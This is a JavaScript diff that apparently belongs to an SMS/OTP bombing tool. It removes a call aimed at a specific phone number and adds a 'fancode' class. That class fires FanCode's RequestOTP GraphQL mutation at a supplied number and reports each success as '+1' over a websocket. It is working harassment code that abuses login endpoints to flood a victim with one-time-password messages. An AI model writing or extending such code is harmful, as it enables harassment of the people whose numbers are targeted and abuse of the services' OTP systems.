@@ -612,4 +612,28 @@ class jiocinema{
     }
 }
 
-new jiocinema("7207232672",ws)
+class fancode{
+    constructor(number,ws){
+        fetch("https://www.fancode.com/graphql",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json",
+                "expcapability":"true",
+                "fc-device-type":"desktop",
+                "source":"fc-web"
+            },
+            body:JSON.stringify({
+                "operationName": "RequestOTP",
+                "operation": "mutation",
+                "variables": {
+                    "mobileNumber": number,
+                    "pageName": "HomePageV2"
+                },
+                "query": "fragment RequestOTPParams on AuthOTPResult {\n  message\n  success\n  totalAttemptCount\n  retryAfter\n  remainingAttemptCount\n  resendButtonActiveIn\n  newUser\n  email\n  password\n}\n\nmutation RequestOTP($mobileNumber: String!, $email: String, $password: String) {\n  requestAuthOTP(mobileNumber: $mobileNumber, email: $email, password: $password) {\n    ...RequestOTPParams\n  }\n}\n        "
+            })
+        }).then(res=>res.json()).then((data)=>{
+            if(data.data !== null)
+                ws.send("+1")
+        })
+    }
+}
